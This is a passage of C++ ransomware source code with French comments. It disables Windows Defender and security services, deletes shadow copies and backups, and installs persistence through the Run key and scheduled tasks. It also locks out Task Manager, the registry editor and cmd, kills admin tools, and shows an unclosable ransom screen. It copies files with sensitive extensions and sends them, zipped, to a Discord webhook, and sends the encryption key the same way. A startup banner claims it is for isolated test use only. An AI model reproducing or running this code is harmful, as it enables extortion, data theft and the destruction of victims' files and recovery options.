        for (const auto& service : securityServices) {
            std::string cmd = "net stop " + service + " >nul 2>&1";
            if (system(cmd.c_str()) == 0) {
                success = true;
            }
        }

        // Désactiver temporairement Windows Defender via le registre
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            DWORD value = 1;
            RegSetValueExA(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegSetValueExA(hKey, "DisableAntiVirus", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
            RegCloseKey(hKey);
            success = true;
        }

        return success;
#else
        return false;
#endif
    }

    // Fonction pour voler les fichiers
    bool stealFiles(const std::string& directoryPath) {
#ifdef _WIN32
        try {
            // Créer un dossier temporaire pour stocker les fichiers volés
            std::string tempDir = std::getenv("TEMP");
            std::string stealDir = tempDir + "\\WindowsUpdate";
            fs::create_directories(stealDir);

            // Types de fichiers sensibles à voler
            const std::vector<std::string> sensitiveExtensions = {
                ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".txt", ".jpg", ".jpeg", ".png",
                ".zip", ".rar", ".7z", ".key", ".pem", ".env", ".config", ".ini", ".json",
                ".xml", ".sql", ".db", ".sqlite", ".bak", ".backup", ".old", ".log"
            };

            std::vector<std::string> stolenFiles;
            int totalSize = 0;
            const int MAX_TOTAL_SIZE = 100 * 1024 * 1024; // 100 MB max

            // Parcourir récursivement le dossier
            for (const auto& entry : fs::recursive_directory_iterator(directoryPath)) {
                if (!fs::is_regular_file(entry.status())) continue;

                std::string extension = entry.path().extension().string();
                std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);

                // Vérifier si l'extension est sensible
                bool isSensitive = false;
                for (const auto& ext : sensitiveExtensions) {
                    if (extension == ext) {
                        isSensitive = true;
                        break;
                    }
                }

                if (isSensitive) {
                    std::string sourcePath = entry.path().string();
                    std::string fileName = entry.path().filename().string();
                    std::string destPath = stealDir + "\\" + fileName;

                    // Vérifier la taille du fichier
                    int fileSize = static_cast<int>(fs::file_size(entry.path()));
                    if (totalSize + fileSize > MAX_TOTAL_SIZE) break;

                    // Copier le fichier
                    fs::copy_file(sourcePath, destPath, fs::copy_options::overwrite_existing);
                    stolenFiles.push_back(fileName);
                    totalSize += fileSize;
                }
            }

            // Créer une archive ZIP des fichiers volés
            std::string zipPath = stealDir + "\\stolen_files.zip";
            std::string zipCmd = "powershell Compress-Archive -Path \"" + stealDir + "\\*\" -DestinationPath \"" + zipPath + "\" -Force";
            system(zipCmd.c_str());

            // Lire le fichier ZIP
            std::ifstream zipFile(zipPath, std::ios::binary);
            if (!zipFile) return false;

            std::vector<unsigned char> zipData(
                (std::istreambuf_iterator<char>(zipFile)),
                std::istreambuf_iterator<char>()
            );
            zipFile.close();

            // Convertir en base64
            std::string zipBase64 = Base64Encode(zipData);

            // Créer le payload JSON pour Discord
            std::stringstream jsonPayload;
            jsonPayload << "{";
            jsonPayload << "\"content\": \"⚠️ Fichiers volés de la victime " << victimId << "\",";
            jsonPayload << "\"embeds\": [{";
            jsonPayload << "\"title\": \"Fichiers sensibles volés\",";
            jsonPayload << "\"color\": 15158332,";
            jsonPayload << "\"fields\": [";
            jsonPayload << "{\"name\": \"ID Victime\", \"value\": \"" << victimId << "\", \"inline\": true},";
            jsonPayload << "{\"name\": \"Nombre de fichiers\", \"value\": \"" << stolenFiles.size() << "\", \"inline\": true},";
            jsonPayload << "{\"name\": \"Taille totale\", \"value\": \"" << (totalSize / 1024 / 1024) << " MB\", \"inline\": true},";
            jsonPayload << "{\"name\": \"Fichiers volés\", \"value\": \"" << (stolenFiles.size() > 0 ? stolenFiles[0] : "Aucun") << "\", \"inline\": false}";
            jsonPayload << "],";
            jsonPayload << "\"description\": \"Archive ZIP des fichiers volés (Base64):\\n```" << zipBase64 << "```\"";
            jsonPayload << "}]}";

            // Envoyer via webhook
            bool sent = SendHttpPost(WEBHOOK_URL, jsonPayload.str());

            // Nettoyer
            fs::remove_all(stealDir);
            fs::remove(zipPath);

            return sent;
        }
        catch (...) {
            return false;
        }
#else
        return false;
#endif
    }

    // Fonction pour supprimer les points de restauration et les sauvegardes
    bool deleteBackups() {
#ifdef _WIN32
        try {
            bool success = false;
            
            // Supprimer tous les points de restauration
            std::cout << "[*] Suppression des points de restauration Windows..." << std::endl;
            if (system("vssadmin delete shadows /all /quiet >nul 2>&1") == 0) {
                success = true;
                std::cout << "[+] Points de restauration supprimés" << std::endl;
            } else {
                std::cout << "[-] Échec de la suppression des points de restauration" << std::endl;
            }
            
            // Désactiver la protection système
            std::cout << "[*] Désactivation de la protection système..." << std::endl;
            if (system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"RPSessionInterval\" /t REG_DWORD /d \"0\" /f >nul 2>&1") == 0) {
                success = true;
                std::cout << "[+] Protection système désactivée" << std::endl;
            } else {
                std::cout << "[-] Échec de la désactivation de la protection système" << std::endl;
            }
            
            // Supprimer les sauvegardes Windows
            std::cout << "[*] Suppression des sauvegardes Windows..." << std::endl;
            if (system("wbadmin delete catalog -quiet >nul 2>&1") == 0) {
                success = true;
                std::cout << "[+] Catalogue de sauvegarde supprimé" << std::endl;
            } else {
                std::cout << "[-] Échec de la suppression du catalogue de sauvegarde" << std::endl;
            }
            
            // Supprimer les fichiers de sauvegarde
            std::vector<std::string> backupPaths = {
                "C:\\Windows.old",
                "C:\\$Recycle.Bin",
                "C:\\System Volume Information",
                "C:\\Recovery",
                "C:\\Users\\All Users\\Application Data\\Microsoft\\Windows\\Backup",
                "C:\\ProgramData\\Microsoft\\Windows\\Backup"
            };
            
            for (const auto& path : backupPaths) {
                if (fs::exists(path)) {
                    try {
                        fs::remove_all(path);
                        std::cout << "[+] Supprimé: " << path << std::endl;
                    } catch (...) {
                        std::cout << "[-] Échec de la suppression: " << path << std::endl;
                    }
                }
            }
            
            return success;
        }
        catch (...) {
            return false;
        }
#else
        return false;
#endif
    }
    
    // Configuration de la persistance avancée
    bool setupAdvancedPersistence() {
#ifdef _WIN32
        bool success = false;
        std::string exePath = GetExecutablePath();
        if (exePath.empty()) return false;
        
        // 1. Méthode standard (Run key)
        if (AddToStartup(exePath, "WindowsSecurityService")) {
            success = true;
        }
        
        // 2. Méthode avec planificateur de tâches
        std::string taskCmd = "schtasks /create /tn \"WindowsSecurityTask\" /tr \"" + exePath + 
                             "\" /sc onlogon /rl highest /f >nul 2>&1";
        if (system(taskCmd.c_str()) == 0) {
            success = true;
        }
        
        // 3. Méthode avec WMI (plus discrète)
        std::string wmiCmd = "powershell -Command \"$A = New-ScheduledTaskAction -Execute '" + 
                            exePath + "'; $T = New-ScheduledTaskTrigger -AtStartup; " +
                            "Register-ScheduledTask -TaskName 'WindowsSecurityWMI' -Action $A -Trigger $T -Force\" >nul 2>&1";
        if (system(wmiCmd.c_str()) == 0) {
            success = true;
        }
        
        // 4. Désactiver les options de démarrage sécurisé pour empêcher de démarrer en mode sans échec
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\SafeBoot", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            // Désactiver le mode sans échec
            RegSetValueExA(hKey, "AlternateShell", 0, REG_SZ, (BYTE*)"", 1);
            RegCloseKey(hKey);
            success = true;
        }
        
        return success;
#else
        return false;
#endif
    }
    
public:
    Ransomware() : encryptedFilesCount(0), failedFilesCount(0) {
        // Générer un ID unique pour la victime
        victimId = GenerateUUID();
        
        // Initialiser les chemins
#ifdef _WIN32
        // Sous Windows
        char desktop[MAX_PATH];
        char documents[MAX_PATH];
        
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktop))) {
            desktopPath = desktop;
        }
        
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, documents))) {
            documentsPath = documents;
        }
#else
        // Sous Linux/MacOS
        const char* homeDir = getenv("HOME");
        if (homeDir) {
            desktopPath = std::string(homeDir) + "/Desktop";
            documentsPath = std::string(homeDir) + "/Documents";
        }
#endif

        ransomNotePath = desktopPath + "/RANSOM_NOTE.txt";
    }
    
    // Exécuter le ransomware
    void run() {
        // Vérifier si le ransomware est déjà en cours d'exécution
        if (isRansomwareRunning()) {
            // Attendre que l'autre instance se termine (attente de 30s)
            Sleep(30000);
        }
        
        // Charger l'état précédent (après un redémarrage)
        EncryptionState state = loadEncryptionState();
        
        // Si le chiffrement est déjà terminé, juste afficher la fenêtre bloquante
        if (state.completed) {
#ifdef _WIN32
            SharedData data;
            data.totalFiles = encryptedFilesCount.load();
            data.processedFiles = encryptedFilesCount.load();
            
            HWND blockingWindow = CreateFullscreenBlockingWindow(&data);
            
            // Boucle de message pour garder la fenêtre ouverte
            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
#endif
            return;
        }
        
        // Mettre à jour l'état
        state.started = true;
        saveEncryptionState(state);
        
#ifdef _WIN32
        // Optimiser la priorité du processus
        setHighestPriority();
        
        // Désactiver les contrôles système
        disableSystemControls();
        
        // Tuer les processus essentiels
        killEssentialProcesses();
        
        // Préparer les données partagées pour la fenêtre
        SharedData data;
        data.totalFiles = 1000;
        data.processedFiles = 0;
        
        // Créer la fenêtre bloquante
        HWND blockingWindow = CreateFullscreenBlockingWindow(&data);
#endif

        // Setup persistance avancée pour survivre aux redémarrages
        setupAdvancedPersistence();
        
        // Exécuter le chiffrement en arrière-plan
        auto startTime = std::chrono::high_resolution_clock::now();
        
        // Désactiver les logiciels de sécurité
        disableSecuritySoftware();
        
        // Supprimer les sauvegardes
        deleteBackups();
        
        // Voler les fichiers en arrière-plan
        std::thread stealThread([this]() {
            stealFiles(documentsPath);
        });
        
        // Générer la clé et la sauvegarder
        encryption.saveKey("decrypt_key.key");
        
        // Cibles de chiffrement
        std::vector<std::string> targets = {
            desktopPath,
            documentsPath,
            "C:\\Users",
            "D:\\"
        };
        
        // Filtrer les cibles déjà chiffrées après redémarrage
        std::vector<std::string> targetsToEncrypt;
        for (const auto& target : targets) {
            if (fs::exists(target)) {
                bool alreadyEncrypted = false;
                for (const auto& encrypted : state.encryptedPaths) {
                    if (target == encrypted) {
                        alreadyEncrypted = true;
                        break;
                    }
                }
                
                if (!alreadyEncrypted) {
                    targetsToEncrypt.push_back(target);
                }
            }
        }
        
        // Traiter les fichiers en parallèle
        scanAndEncrypt(desktopPath);
        
        // Attendre le thread de vol de fichiers
        if (stealThread.joinable()) stealThread.join();
        
        // Créer la note de rançon
        createRansomNote();
        
        // Changer le fond d'écran
        changeDesktopBackground();
        
        // Envoyer la clé via webhook
        sendKeyToWebhook();
        
        // Mettre à jour l'état
        state.completed = true;
        saveEncryptionState(state);
        
        auto endTime = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::seconds>(endTime - startTime);
        
        std::cout << "[+] Chiffrement terminé en " << duration.count() << " secondes" << std::endl;
        std::cout << "[+] " << encryptedFilesCount << " fichiers chiffrés" << std::endl;
        
#ifdef _WIN32
        // Garder la fenêtre bloquante ouverte indéfiniment
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
#endif
    }
};

// Classe pour le déchiffrement
class Decryptor {
private:
    Encryption encryption;
    std::atomic<int> decryptedFilesCount;
    std::atomic<int> failedFilesCount;
    std::mutex outputMutex;
    
    // Déchiffrer un fichier
    bool processFile(const std::string& filePath) {
        try {
            // Vérifier si le fichier est chiffré
            if (filePath.find(ENCRYPTED_EXTENSION) == std::string::npos) {
                return false;
            }
            
            // Déchiffrer le fichier
            bool success = encryption.decryptFile(filePath);
            
            if (success) {
                // Supprimer le fichier chiffré
                fs::remove(filePath);
                decryptedFilesCount++;
                
                {
                    std::lock_guard<std::mutex> lock(outputMutex);
                    std::cout << "[+] Déchiffré: " << filePath << std::endl;
                }
                
                return true;
            }
            else {
                failedFilesCount++;
                return false;
            }
        }
        catch (...) {
            failedFilesCount++;
            return false;
        }
    }
    
    // Parcourir récursivement un répertoire
    void scanAndDecrypt(const std::string& directoryPath) {
        try {
            std::vector<std::string> filesToProcess;
            
            for (const auto& entry : fs::recursive_directory_iterator(directoryPath)) {
                if (fs::is_regular_file(entry.status())) {
                    filesToProcess.push_back(entry.path().string());
                }
            }
            
            // Traiter les fichiers en parallèle
            const unsigned int numThreads = std::thread::hardware_concurrency();
            std::vector<std::future<void>> futures;
            
            for (unsigned int i = 0; i < numThreads; i++) {
                futures.push_back(std::async(std::launch::async, [this, &filesToProcess, i, numThreads]() {
                    for (size_t j = i; j < filesToProcess.size(); j += numThreads) {
                        processFile(filesToProcess[j]);
                    }
                }));
            }
            
            // Attendre que tous les threads terminent
            for (auto& future : futures) {
                future.wait();
            }
        }
        catch (...) {
            // Ignorer les erreurs
        }
    }
    
public:
    Decryptor(const std::string& keyPath) : encryption(keyPath), decryptedFilesCount(0), failedFilesCount(0) {}
    
    // Exécuter le déchiffrement
    void run(const std::string& path) {
        std::cout << "[*] Démarrage du déchiffrement..." << std::endl;
        
        auto startTime = std::chrono::high_resolution_clock::now();
        
        scanAndDecrypt(path);
        
        // Supprimer la persistance
        RemoveFromStartup("WindowsSecurityService");
        
        // Afficher les statistiques
        auto endTime = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::seconds>(endTime - startTime);
        
        std::cout << "[+] Déchiffrement terminé en " << duration.count() << " secondes" << std::endl;
        std::cout << "[+] " << decryptedFilesCount << " fichiers déchiffrés" << std::endl;
        std::cout << "[+] " << failedFilesCount << " fichiers non déchiffrés (erreurs)" << std::endl;
        std::cout << "[+] Persistance désactivée" << std::endl;
    }
};

// Fonction pour créer une fenêtre plein écran bloquante
#ifdef _WIN32
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_KEYDOWN:
        case WM_KEYUP:
        case WM_SYSKEYDOWN:
        case WM_SYSKEYUP:
            // Bloquer toutes les touches
            return 0;
        case WM_CLOSE:
        case WM_DESTROY:
            // Empêcher la fermeture de la fenêtre
            return 0;
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            
            // Fond noir
            RECT rc;
            GetClientRect(hwnd, &rc);
            FillRect(hdc, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));
            
            // Texte "RANSOMWARE" en rouge
            SetBkMode(hdc, TRANSPARENT);
            SetTextColor(hdc, RGB(255, 0, 0));
            
            // Police grande et en gras
            HFONT hFont = CreateFont(static_cast<int>(72), 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, 
                                    ANSI_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, 
                                    CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
            HFONT hOldFont = (HFONT)SelectObject(hdc, hFont);
            
            // Centrer le texte
            DrawText(hdc, "RANSOMWARE", -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
            
            // Sous-titre
            SetTextColor(hdc, RGB(255, 255, 255));
            HFONT hFontSmall = CreateFont(static_cast<int>(24), 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, 
                                    ANSI_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS, 
                                    CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_SWISS, "Arial");
            SelectObject(hdc, hFontSmall);
            
            RECT rcSub = rc;
            rcSub.top += 100;
            DrawText(hdc, "Vos fichiers sont en cours de chiffrement", -1, &rcSub, DT_CENTER | DT_SINGLELINE);
            
            // Dessiner une barre de progression
            int progressBarWidth = rc.right - rc.left - 200;
            int progressBarHeight = 30;
            int progressBarX = (rc.right - progressBarWidth) / 2;
            int progressBarY = rc.bottom - 200;
            
            // Contour de la barre
            HPEN hPen = CreatePen(PS_SOLID, 2, RGB(255, 255, 255));
            HPEN hOldPen = (HPEN)SelectObject(hdc, hPen);
            
            Rectangle(hdc, progressBarX, progressBarY, progressBarX + progressBarWidth, progressBarY + progressBarHeight);
            
            // Nettoyer
            SelectObject(hdc, hOldFont);
            SelectObject(hdc, hOldPen);
            DeleteObject(hFont);
            DeleteObject(hFontSmall);
            DeleteObject(hPen);
            
            EndPaint(hwnd, &ps);
            return 0;
        }
        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
}

// Thread pour mettre à jour la barre de progression
DWORD WINAPI UpdateProgressThread(LPVOID lpParam) {
    SharedData* data = (SharedData*)lpParam;
    
    while (true) {
        // Forcer le rafraîchissement de la fenêtre
        InvalidateRect(data->hwnd, NULL, TRUE);
        Sleep(200); // Rafraîchir toutes les 200ms
    }
    
    return 0;
}

HWND CreateFullscreenBlockingWindow(SharedData* data) {
    // Enregistrer la classe de fenêtre
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = "RansomwareBlockingWindow";
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    
    RegisterClass(&wc);
    
    // Obtenir la résolution de l'écran
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    // Créer une fenêtre plein écran
    HWND hwnd = CreateWindowEx(
        WS_EX_TOPMOST,              // Toujours au premier plan
        "RansomwareBlockingWindow", // Classe de fenêtre
        "RANSOMWARE",               // Titre de la fenêtre
        WS_POPUP | WS_VISIBLE,      // Style sans bordures
        0, 0,                       // Position (0,0)
        screenWidth, screenHeight,  // Dimensions plein écran
        NULL, NULL,                 // Pas de parent ni de menu
        GetModuleHandle(NULL),      // Instance
        NULL                        // Pas de paramètre supplémentaire
    );
    
    // Lier les données partagées à la fenêtre
    data->hwnd = hwnd;
    
    // Démarrer le thread de mise à jour
    CreateThread(NULL, 0, UpdateProgressThread, data, 0, NULL);
    
    return hwnd;
}

// Fonction pour désactiver le Gestionnaire des tâches
bool disableTaskManager() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

// Fonction pour désactiver le Registre
bool disableRegistry() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueEx(hKey, "DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

// Fonction pour désactiver Cmd et PowerShell
bool disableCmd() {
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Policies\\Microsoft\\Windows\\System", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueEx(hKey, "DisableCMD", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

// Fonction pour empêcher l'arrêt du système
bool preventShutdown() {
    // Désactiver le bouton d'arrêt
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueEx(hKey, "NoClose", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

// Fonction pour désactiver tous les contrôles système d'un coup
bool disableSystemControls() {
    bool success = false;
    
    // Désactiver ALT+TAB
    system("REG ADD \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v \"NoWinKeys\" /t REG_DWORD /d 1 /f >nul 2>&1");
    
    // Désactiver le gestionnaire des tâches
    if (disableTaskManager()) success = true;
    
    // Désactiver le registre
    if (disableRegistry()) success = true;
    
    // Désactiver Cmd et PowerShell
    if (disableCmd()) success = true;
    
    // Empêcher l'arrêt du système
    if (preventShutdown()) success = true;
    
    return success;
}

// Fonction pour tuer les processus essentiels
void killEssentialProcesses() {
    // Liste des processus à terminer
    const std::vector<std::string> processes = {
        "taskmgr.exe",    // Gestionnaire des tâches
        "procexp.exe",    // Process Explorer
        "procexp64.exe",  // Process Explorer 64 bits
        "regedit.exe",    // Éditeur du Registre
        "explorer.exe",   // Explorateur Windows (bureau)
        "msconfig.exe",   // Configuration système
        "perfmon.exe",    // Moniteur de performances
        "services.msc",   // Services
        "mmc.exe",        // Console de gestion Microsoft
        "compmgmt.msc",   // Gestion de l'ordinateur
        "secpol.msc",     // Stratégie de sécurité locale
        "eventvwr.msc"    // Observateur d'événements
    };
    
    for (const auto& process : processes) {
        std::string cmd = "taskkill /F /IM " + process + " >nul 2>&1";
        system(cmd.c_str());
    }
}

// Fonction pour optimiser la priorité du processus
void setHighestPriority() {
    // Définir la priorité du processus actuel à la valeur maximale
    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    
    // Définir la priorité de chaque thread à la valeur maximale
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
}
#endif

int main(int argc, char* argv[]) {
    // Configuration de la console Windows
#ifdef _WIN32
    setupConsole();
#endif

    // Initialiser OpenSSL
    OpenSSL_add_all_algorithms();
    
    if (argc > 1 && std::string(argv[1]) == "decrypt") {
        if (argc < 3) {
            std::cout << "Usage: " << argv[0] << " decrypt <key_file> [path_to_decrypt]" << std::endl;
            return 1;
        }
        
        std::string keyPath = argv[2];
        std::string decryptPath = (argc > 3) ? argv[3] : fs::current_path().string();
        
        try {
            Decryptor decryptor(keyPath);
            decryptor.run(decryptPath);
        }
        catch (const std::exception& e) {
            std::cerr << "Erreur: " << e.what() << std::endl;
            return 1;
        }
    }
    else {
        std::cout << BANNER << std::endl;
        std::cout << std::endl;
        std::cout << "⚠️ ATTENTION ⚠️" << std::endl;
        std::cout << "Ce programme est un véritable ransomware qui va chiffrer vos fichiers!" << std::endl;
        std::cout << "À utiliser UNIQUEMENT dans un environnement de test isolé." << std::endl;
        std::cout << std::endl;
        std::cout << "Tapez 'CONTINUER' pour procéder ou CTRL+C pour annuler: ";
        
        std::string confirmation;
        std::getline(std::cin, confirmation);
        
        std::transform(confirmation.begin(), confirmation.end(), confirmation.begin(), ::toupper);
        
        if (confirmation == "CONTINUER") {
            try {
                Ransomware ransomware;
                ransomware.run();
            }
            catch (const std::exception& e) {
                std::cerr << "Erreur: " << e.what() << std::endl;
                return 1;
            }
        }
        else {
            std::cout << "Opération annulée." << std::endl;
        }
    }
    
    return 0;
} 